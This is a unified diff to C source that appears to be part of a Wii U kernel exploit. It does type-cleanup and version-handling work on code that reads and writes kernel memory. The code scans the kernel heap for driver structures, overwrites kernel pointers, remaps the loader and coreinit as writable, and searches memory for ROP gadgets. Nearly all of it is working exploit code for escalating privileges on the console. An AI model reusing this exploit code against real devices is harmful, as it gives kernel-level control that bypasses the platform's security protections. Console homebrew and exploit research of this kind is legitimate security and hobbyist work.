@@ -258,12 +258,12 @@ void _start()
 
 	/* Search the kernel heap for DRVA and DRVHAX */
 	uint32_t drva_addr = 0, drvhax_addr = 0;
-	uint32_t metadata_addr = KERN_HEAP + 0x14 + (kern_read(KERN_HEAP + 0x0c) * 0x10);
+	uint32_t metadata_addr = KERN_HEAP + 0x14 + (kern_read((void*)(KERN_HEAP + 0x0c)) * 0x10);
 	while (metadata_addr >= KERN_HEAP + 0x14)
 	{
 		/* Read the data address from the metadata, then read the data */
-		uint32_t data_addr = kern_read(metadata_addr);
-		uint32_t data = kern_read(data_addr);
+		uint32_t data_addr = kern_read((void*)metadata_addr);
+		uint32_t data = kern_read((void*)data_addr);
 
 		/* Check for DRVA or DRVHAX, and if both are found, break */
 		if (data == 0x44525641) drva_addr = data_addr;
@@ -276,11 +276,15 @@ void _start()
 	if (!(drva_addr && drvhax_addr)) OSFatal("Failed to find DRVA or DRVHAX");
 
 	/* Make DRVHAX point to DRVA to ensure a clean exit */
-	kern_write(drvhax_addr + 0x48, drva_addr);
+	kern_write((void*)(drvhax_addr + 0x48), drva_addr);
 
 	/* Map the loader and coreinit as RW before exiting */
-	kern_write(KERN_ADDRESS_TBL + (0x12 * 4), 0x31000000);
-	kern_write(KERN_ADDRESS_TBL + (0x13 * 4), 0x28305800);
+#if (VER<410)
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x30000000);
+#else
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x31000000);
+#endif
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x13 * 4)), 0x28305800);
 	_Exit();
 
 after_exploit: ;
@@ -316,13 +320,13 @@ void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start)
 	uint32_t *ptr;
 
 	/* Search code before JIT area first */
-	for (ptr = (uint32_t*) gadgets_start; ptr != JIT_ADDRESS; ptr++)
+	for (ptr = (uint32_t*) gadgets_start; ptr != (uint32_t*) JIT_ADDRESS; ptr++)
 	{
 		if (!memcmp(ptr, &code[0], length)) return ptr;
 	}
 
 	/* Restart search after JIT */
-	for (ptr = (uint32_t*) CODE_ADDRESS_START; ptr != CODE_ADDRESS_END; ptr++)
+	for (ptr = (uint32_t*) CODE_ADDRESS_START; ptr != (uint32_t*) CODE_ADDRESS_END; ptr++)
 	{
 		if (!memcmp(ptr, &code[0], length)) return ptr;
 	}
